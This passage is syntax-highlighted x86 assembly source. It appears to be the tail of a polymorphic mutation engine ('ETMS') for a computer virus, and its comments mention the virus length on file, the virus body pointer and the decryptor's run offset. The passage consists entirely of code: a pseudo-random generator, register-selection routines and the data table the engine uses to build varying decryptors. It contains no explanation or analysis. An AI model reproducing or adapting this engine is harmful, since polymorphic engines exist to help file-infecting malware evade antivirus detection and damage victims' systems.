        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_runnin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b1h</span><span class="sc0">            </span><span class="sc1">; mov cl,</span><span class="sc0">
</span><span class="sc5">t_memand</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; significant bytes present</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">search_offset2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; is &lt; starting off of poly?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">search_offset2</span><span class="sc0">
</span><span class="sc5">look_foroff2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; upper border</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">ok_offset2</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">look_foroff2</span><span class="sc0">
</span><span class="sc5">ok_offset2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_random_al7</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0b8h</span><span class="sc0">                     </span><span class="sc1">; mov eax,</span><span class="sc0">
</span><span class="sc5">seed</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">000h</span><span class="sc0">                     </span><span class="sc1">; random seed, must be &lt; im</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4096d</span><span class="sc0">                </span><span class="sc1">; ia</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">150889d</span><span class="sc0">              </span><span class="sc1">; ic</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">714025d</span><span class="sc0">              </span><span class="sc1">; im</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">seed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; * 2^32 - 1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; here we have a 0&lt;=rnd&lt;=2^32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">is_used</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; AL register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_used</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">; Z  = register not used</span><span class="sc0">
</span><span class="sc1">; NZ = register used</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_used</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; AL register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_used</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">unset_used</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; BL register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_used</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_register</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">reget_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">is_used</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">reget_reg</span><span class="sc0">               </span><span class="sc1">; check we aren't using it</span><span class="sc0">
</span><span class="sc1">; the is_used will put the reg in cl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; how much memory does the ETMS need, so you can substract from the lenght</span><span class="sc0">
</span><span class="sc1">; of the virus on file of course</span><span class="sc0">
</span><span class="sc5">_mem_space</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_mem_data_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_mem_data_start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">_mem_data_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">t_inipnt</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; initial EDI</span><span class="sc0">

</span><span class="sc5">r_pointer</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; register used as pointer</span><span class="sc0">
</span><span class="sc5">r_counter</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; register used as counter</span><span class="sc0">
</span><span class="sc5">r_regkey</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; register used as key, 20h use</span><span class="sc0">
                                        </span><span class="sc1">; immediate as key</span><span class="sc0">
</span><span class="sc5">r_used</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
</span><span class="sc1">;  bits meaning          0 0 0 1 0 0 0 0</span><span class="sc0">
</span><span class="sc1">;                        E E E E E E E E</span><span class="sc0">
</span><span class="sc1">;                        D S B S B D C A</span><span class="sc0">
</span><span class="sc1">;                        I I P P X X X X</span><span class="sc0">

</span><span class="sc5">t_chgpnt</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; changes to be made to pointer</span><span class="sc0">
</span><span class="sc5">t_chgcnt</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; changes to be made to counter</span><span class="sc0">
</span><span class="sc5">t_chgkey</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; changes to be made to key register</span><span class="sc0">
</span><span class="sc5">t_chgmat</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; changes to be made to operation</span><span class="sc0">

</span><span class="sc5">t_pntoff</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; offset added to pointer (00h if not</span><span class="sc0">
                                        </span><span class="sc1">; added)</span><span class="sc0">
</span><span class="sc5">t_cntoff</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; constant to be added to counter</span><span class="sc0">
                                        </span><span class="sc1">; value</span><span class="sc0">

</span><span class="sc5">t_fromend</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; 00h from start, else from end</span><span class="sc0">
</span><span class="sc5">t_countback</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; 00h decrementing, else incrementing</span><span class="sc0">
</span><span class="sc5">t_pushed</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; pushed dwords</span><span class="sc0">
</span><span class="sc5">t_maxjmps</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; max jumps</span><span class="sc0">
</span><span class="sc5">t_inacall</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; into a call or not</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; just to optimize poly size :)</span><span class="sc0">

</span><span class="sc5">v_lenght</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; lenght</span><span class="sc0">
</span><span class="sc5">v_virusp</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; pointer to body</span><span class="sc0">
</span><span class="sc5">v_runnin</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; offset at which dec will run</span><span class="sc0">

</span><span class="sc5">w_counter</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; where counter is assigned - 1</span><span class="sc0">
</span><span class="sc5">w_pointer</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; where pointer is assigned - 1</span><span class="sc0">
</span><span class="sc5">w_loopbg</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; where loop begins</span><span class="sc0">
</span><span class="sc5">w_encrypt</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; pointer on current pos in encryptor</span><span class="sc0">

</span><span class="sc5">_mem_data_end</span><span class="sc4">:</span><span class="sc0">




</span></div></body>
</html>
